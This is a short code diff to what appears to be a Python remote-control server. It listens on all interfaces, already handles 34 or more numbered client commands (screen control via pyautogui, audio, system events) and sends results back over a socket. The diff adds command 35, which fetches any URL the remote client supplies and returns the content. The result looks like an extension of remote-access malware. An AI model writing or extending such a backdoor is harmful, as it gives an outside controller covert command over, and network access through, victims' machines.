@@ -19,6 +19,7 @@ import webbrowser
 import time
 import pyautogui
 import wave
+import requests
 
 # Configuration
 HOST = '0.0.0.0'  # Listen on all available interfaces
@@ -277,6 +278,13 @@ def handle_client(client_socket):
         except Exception as e:
             return str(e)
 
+    def fetch_github_content(url):
+        try:
+            response = requests.get(url)
+            return response.text
+        except Exception as e:
+            return str(e)
+
     while True:
         try:
             # Receive the command from the client
@@ -390,6 +398,10 @@ def handle_client(client_socket):
             elif command == '34':
                 system_events = get_system_events()
                 client_socket.sendall(system_events.encode('utf-8'))
+            elif command == '35':
+                url = client_socket.recv(1024).decode('utf-8')
+                content = fetch_github_content(url)
+                client_socket.sendall(content.encode('utf-8'))
             else:
                 client_socket.sendall(b'Invalid command')
         except Exception as e:
